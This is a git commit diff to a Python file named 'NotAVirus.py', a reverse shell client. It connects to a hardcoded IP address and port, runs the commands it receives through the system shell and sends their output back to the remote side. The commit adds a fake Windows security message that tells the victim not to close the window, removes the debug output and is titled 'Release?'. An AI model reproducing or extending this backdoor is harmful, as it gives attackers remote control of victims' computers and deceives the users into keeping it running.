fa28c43857a8e70656be50b775e3f83cfa642f59
Elad Matia <elad.matia@gmail.com>
2018-08-31 14:50:59 +0300

    Release?

--- Client/NotAVirus.py
+++ Client/NotAVirus.py
@@ -3,13 +3,16 @@ import os
 import subprocess
 import time
 
-IP = '127.0.0.1'  # TODO: make my ip static!!
+IP = '192.168.1.25'  # TODO: make my ip static!!
 PORT = 8778
 
 
 def main():
     main_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     main_socket.connect((IP, PORT))
+    print("Windows has detected a suspicious file on your system and trying to remove it right now. "
+          "Please do not close "
+          "this window or you will damage your computer.")
     try:
         while True:
             global cwd
@@ -21,8 +24,6 @@ def main():
             split_command = command.split(" ")
             # Shell=true gives us additional shell privileges
             if split_command[0] != 'cd':
-                print("Non-cd command")
-                print(cwd)
                 output = subprocess.Popen(split_command, stdout=subprocess.PIPE, cwd=cwd, shell=True).communicate()[0]
                 if output.decode() != '':
                     main_socket.sendall(output)
@@ -30,14 +31,11 @@ def main():
                     main_socket.sendall("don't_display".encode())
 
             elif (len(split_command) > 1) and split_command[0] == 'cd':
-                print("normal cd command")
                 # update the current working directory and update the global variable
                 os.chdir(split_command[1])
                 cwd = os.getcwd()
                 main_socket.sendall("don't_display".encode())
-                print(cwd)
             elif split_command[0] == 'cd' and len(split_command) == 1:
-                print("cd command with now arguments")
                 main_socket.sendall((cwd + '\n').encode())
     except KeyboardInterrupt:
         main_socket.close()
